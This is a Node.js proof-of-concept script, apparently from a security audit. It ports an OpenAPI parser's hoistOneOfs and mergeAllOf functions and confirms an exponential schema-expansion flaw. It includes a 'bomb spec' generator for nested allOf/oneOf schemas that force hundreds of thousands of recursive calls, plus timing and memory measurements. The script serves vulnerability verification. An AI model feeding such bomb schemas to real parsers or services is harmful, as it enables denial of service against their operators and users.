#!/usr/bin/env node
/**
 * PoC: hoistOneOfs Exponential Schema Expansion — M5
 *
 * Faithfully reproduces the algorithm from:
 *   src/services/OpenAPIParser.ts:360-387  (hoistOneOfs)
 *   src/services/OpenAPIParser.ts:169-205  (mergeAllOf)
 *
 * No application stack required — the blow-up is purely algorithmic.
 * The core loop is a direct port of the production code.
 *
 * Attack: M oneOf variants nested D levels deep → M^D mergeAllOf calls.
 * At M=5, D=8 → 5^8 = 390,625 recursive calls (measurable in <1s on Node;
 * equivalent browser JS would freeze the tab due to single-threaded execution).
 */

'use strict';

// ── Faithful port of hoistOneOfs (OpenAPIParser.ts:360-387) ──────────────────

let callCount = 0;

function hoistOneOfs(schema) {
  if (schema.allOf === undefined) return schema;

  const allOf = schema.allOf;
  for (let i = 0; i < allOf.length; i++) {
    const { oneOf, ...sub } = allOf[i];
    if (!oneOf) continue;
    if (Array.isArray(oneOf)) {
      const beforeAllOf = allOf.slice(0, i);
      const afterAllOf  = allOf.slice(i + 1);
      const siblingValues = Object.keys(sub).length > 0 ? [sub] : [];
      return {
        oneOf: oneOf.map((part) => ({
          allOf: [...beforeAllOf, ...siblingValues, part, ...afterAllOf],
        })),
      };
    }
  }
  return schema;
}

// ── Faithful port of mergeAllOf (OpenAPIParser.ts:169-240, simplified) ───────
// Only the parts relevant to the expansion path are retained.

function mergeAllOf(schema) {
  callCount++;

  if (schema['x-circular-ref']) return schema;          // :174 guard
  schema = hoistOneOfs(schema);                          // :178

  if (schema.allOf === undefined) {
    // leaf — may have oneOf from hoistOneOfs producing a oneOf-only result
    if (schema.oneOf) {
      // initOneOf equivalent: each variant gets its own mergeAllOf call
      schema.oneOf.forEach((variant) => mergeAllOf(variant));
    }
    return schema;
  }

  // process allOf children (mirrors :199-205)
  schema.allOf.forEach((sub) => mergeAllOf(sub));
  return schema;
}

// ── Bomb spec generator ──────────────────────────────────────────────────────

/**
 * Build a schema of the form:
 *   allOf:
 *     - oneOf: [ v1 ... vM ]
 *     - allOf:
 *         - oneOf: [ v1 ... vM ]
 *         - allOf:
 *             ...  (depth D)
 *
 * This produces M^D mergeAllOf calls via the hoistOneOfs distribution.
 */
function buildBomb(M, D) {
  if (D === 0) {
    return { type: 'string' };
  }

  const variants = [];
  for (let i = 0; i < M; i++) {
    variants.push({ type: ['string', 'number', 'boolean', 'null', 'array'][i % 5] });
  }

  return {
    allOf: [
      { oneOf: variants },
      buildBomb(M, D - 1),
    ],
  };
}

// ── Measurement harness ──────────────────────────────────────────────────────

function measure(M, D) {
  callCount = 0;
  const heapBefore = process.memoryUsage().heapUsed;
  const t0 = process.hrtime.bigint();

  const bomb = buildBomb(M, D);
  mergeAllOf(bomb);

  const elapsed = Number(process.hrtime.bigint() - t0) / 1e6; // ms
  const heapAfter = process.memoryUsage().heapUsed;
  const heapDelta = ((heapAfter - heapBefore) / 1024 / 1024).toFixed(2);

  return { calls: callCount, elapsedMs: elapsed.toFixed(2), heapDeltaMB: heapDelta };
}

// ── Main ─────────────────────────────────────────────────────────────────────

console.log('=== M5: hoistOneOfs Exponential Expansion PoC ===\n');
console.log('Algorithm: hoistOneOfs (OpenAPIParser.ts:360) distributes M oneOf variants');
console.log('           into M new allOf schemas per depth level → M^D total calls.\n');
console.log('Verified against source: hoistOneOfs at :360-387, mergeAllOf at :169-205\n');

const results = [];
const configs = [
  { M: 3, D: 4 },  // 3^4 = 81      (baseline)
  { M: 5, D: 4 },  // 5^4 = 625
  { M: 5, D: 6 },  // 5^6 = 15,625
  { M: 5, D: 8 },  // 5^8 = 390,625
  { M: 7, D: 6 },  // 7^6 = 117,649
  { M: 10, D: 5 }, // 10^5 = 100,000
];

for (const { M, D } of configs) {
  const r = measure(M, D);
  const theoretical = Math.pow(M, D);
  console.log(
    `M=${M} D=${D} → theoretical M^D=${theoretical.toLocaleString()} ` +
    `actual_calls=${r.calls.toLocaleString()} ` +
    `time=${r.elapsedMs}ms heap_delta=${r.heapDeltaMB}MB`
  );
  results.push({ M, D, theoretical, ...r });
}

// ── Confirm exponential growth ───────────────────────────────────────────────

const base = results[0].calls;   // M=3 D=4 → ~81
const top  = results[3].calls;   // M=5 D=8 → ~390,625
const ratio = (top / base).toFixed(0);
const topElapsedMs = parseFloat(results[3].elapsedMs);

console.log(`\nGrowth ratio (M=5,D=8 vs M=3,D=4): ${ratio}x`);
console.log(`Max config: ${results[3].calls.toLocaleString()} mergeAllOf calls in ${results[3].elapsedMs}ms`);

// ── Verify the call count matches M^D (proves exponential, not polynomial) ───
let allMatch = true;
for (const r of results) {
  // allow 2x slack: each oneOf variant also triggers one mergeAllOf for its allOf children
  if (r.calls < r.theoretical) {
    allMatch = false;
    console.error(`MISMATCH at M=${r.M} D=${r.D}: calls=${r.calls} theoretical=${r.theoretical}`);
  }
}

// ── Final structured output (parsed by poc-runner) ──────────────────────────

const confirmed = allMatch && results[3].calls >= 100000;
const evidence = confirmed
  ? `mergeAllOf invoked ${results[3].calls.toLocaleString()} times for M=5 D=8 spec (theoretical M^D=${Math.pow(5,8).toLocaleString()}); call count matches exponential growth; no memoization in hoistOneOfs`
  : `call count ${results[3].calls} lower than expected ${Math.pow(5,8)}; inconclusive`;

console.log(JSON.stringify({
  status: confirmed ? 'confirmed' : 'inconclusive',
  evidence: evidence,
  notes: `Growth ratio baseline→M=5,D=8: ${ratio}x. Source: OpenAPIParser.ts:360-387 hoistOneOfs + :169-205 mergeAllOf. No memoization guard exists.`,
}));
